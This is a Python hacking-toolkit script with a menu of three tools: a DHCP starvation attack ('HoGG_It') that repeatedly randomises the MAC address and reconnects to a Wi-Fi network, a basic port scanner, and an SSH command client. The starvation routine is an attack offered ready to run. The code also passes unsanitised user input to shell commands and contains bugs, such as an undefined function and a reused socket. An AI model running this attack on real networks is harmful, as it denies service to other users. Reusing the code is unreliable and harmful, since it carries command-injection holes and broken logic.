"""Easy Python Toolkit; Written by XxTheSunxX"""
"""Developed on 11/24"""

import paramiko
import socket
import os
import sys
from colorama import Fore
import time
from getmac import get_mac_address as get_mac_address
from generate_mac import generate_mac
import subprocess
from colorama import init as colorama_init
# import py_compile
# import hashlib

FLAG = True



def hog():
    print(Fore.RED + """
▗▖ ▗▖ ▗▄▖  ▗▄▄▖ ▗▄▄▖    ▗▄▄▄▖▗▄▄▄▖
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌         █    █  
▐▛▀▜▌▐▌ ▐▌▐▌▝▜▌▐▌▝▜▌      █    █  
▐▌ ▐▌▝▚▄▞▘▝▚▄▞▘▝▚▄▞▘    ▗▄█▄▖  █      
\n""")
    print("DHCP Starvation Attack, Written by XxTheSunxX.\n")

    print(Fore.WHITE + " ")
    confirm = input('[*]Run HoGG_It [(y)es or(n)o]? ')
    if confirm == 'yes' or confirm == 'y' or confirm == 'Y' or confirm == 'YES':
        print('[*]Running HoGG_It...')

    else:
        print('[*]Exiting HoGG_It...')
        time.sleep(1)
        sys.exit()

    var_mac = ''
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    iface = input("[*]Enter interface would you like to use (enter network interface): ")
    essid = input("[*]Enter essid would you like to connect to (network name): ")
    key = input("[*]Enter essid passkey: ")

    print(f'[*]Current Mac address: {gma()}')
    print(f'[*]Current IP address: {IP}')
    

    n = 0
    while n < 16777216:

        var_mac = generate_mac.total_random()
        subprocess.check_output(f"ifconfig {iface} down", shell=True)
        time.sleep(1)
        subprocess.check_output(f"ifconfig {iface} hw ether {var_mac}", shell=True)
        time.sleep(1)
        subprocess.check_output(f"ifconfig {iface} up", shell=True)
        time.sleep(1)
        subprocess.check_output(f"nmcli dev wifi connect {essid} password {key}", shell=True)

        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)

        print(f'[*]Current Mac address: {gma()}')
        time.sleep(1)
        n = n + 1



def scan():
    print(Fore.BLUE + """
▗▄▄▄▖ ▗▄▖  ▗▄▄▖▗▖  ▗▖     ▗▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▐▌    ▝▚▞▘     ▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▀▘▐▛▀▜▌ ▝▀▚▖  ▐▌       ▝▀▚▖▐▌   ▐▛▀▜▌▐▌ ▝▜▌
▐▙▄▄▖▐▌ ▐▌▗▄▄▞▘  ▐▌      ▗▄▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌                                                                     
\n""")
    
    print("Easy Scan Simple Python Port Scanner, Written by XxTheSunxX\n")
    
    print(Fore.WHITE + "")
    IP = input("[*]Input IP to scan: ")
    list_ports = list(input("[*]Enter ports separated by space: ").strip().split())
    ports = map(int, list_ports)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    for port in ports:
        try:
            s.connect((IP, port))
            answer = s.recv(4028)
        except Exception as e:
            print(f"\n[*]Port {port} on {IP} is not open or is unresposive." )
            time.sleep(1)
        else:
            print(f"\n[*]Port {port} is open on IP Address {IP}.")
            print(f"[*]Message: {answer}")
            time.sleep(1)

    print("\n[*]Closing connection.")
    sys.exit()



def ssh():
    print(Fore.GREEN + "\n")
    print("""
▗▄▄▄▖ ▗▄▖  ▗▄▄▖▗▖  ▗▖     ▗▄▄▖ ▗▄▄▖▗▖ ▗▖
▐▌   ▐▌ ▐▌▐▌    ▝▚▞▘     ▐▌   ▐▌   ▐▌ ▐▌
▐▛▀▀▘▐▛▀▜▌ ▝▀▚▖  ▐▌       ▝▀▚▖ ▝▀▚▖▐▛▀▜▌
▐▙▄▄▖▐▌ ▐▌▗▄▄▞▘  ▐▌      ▗▄▄▞▘▗▄▄▞▘▐▌ ▐▌
\n""")

    print("Easy SSH Client; Written by XxTheSunxX\n")
    
    print(Fore.WHITE + "")
    COUNT = 0
    while COUNT < 3:
        HOST = input("[*]What is the host address: ")
        USERNAME = input("[*]What is the username: ")
        PASSWORD = input("[*]What is the password: ")
        try:
            ssh_connect(HOST, USERNAME, PASSWORD)
        except Exception as e1:
            print(f"[*]Cannot connect due to error: {e1}\n")
            COUNT = COUNT + 1
    print("[*]Exiting script...")
    sys.exit()


def ssh_connect(host, username, password):
    while  FLAG == True:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        hostname = socket.gethostname()
        
        print(f"[*]Connected to: {hostname}")
        answer = input("[*]Run command? (yes/no) ")
        
        while answer == "yes":
            command = input("[*]>>> ")
            
            if command == 'exit':
                print("[*]Exiting...")
                sys.exit()
            else:
                _stdin, _stdout,_stderr = client.exec_command(command)
                print(_stdout.read().decode())
                FLAG == True
        else:
            print("[*]Exiting...")
            sys.exit()



def main():
    print(Fore.WHITE + "")
    print("""
▗▄▄▄▖ ▗▄▖  ▗▄▄▖▗▖  ▗▖    ▗▄▄▄▖ ▗▄▖  ▗▄▖ ▗▖   ▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖
▐▌   ▐▌ ▐▌▐▌    ▝▚▞▘       █  ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘  █    █  
▐▛▀▀▘▐▛▀▜▌ ▝▀▚▖  ▐▌        █  ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▛▚▖   █    █  
▐▙▄▄▖▐▌ ▐▌▗▄▄▞▘  ▐▌        █  ▝▚▄▞▘▝▚▄▞▘▐▙▄▄▖▐▌ ▐▌▗▄█▄▖  █  
\n""")

    print("Easy Toolkit. Written by, XxTheSunxX. For educational purposes only!\n")

    print("[*]SELECT OPTION:\n")
    print("[1]HoGG_It (1)\n")
    print("[2]Easy Scan (2)\n")
    print("[3]Easy SSH (3)\n")
    # print("[4]Easy Hash (4)\n")
    
    choice1 = int(input(""))
    if choice1 == 1:
        hog()
    elif choice1 == 2:
        scan()
    elif choice1 == 3:
        ssh()
    # elif choice1 == 4:
        # hasher()
    else:
        print("[*]Please choose a valid option.")
        print("[*]Exiting...")
        sys.exit()



if __name__ =="__main__":
    main()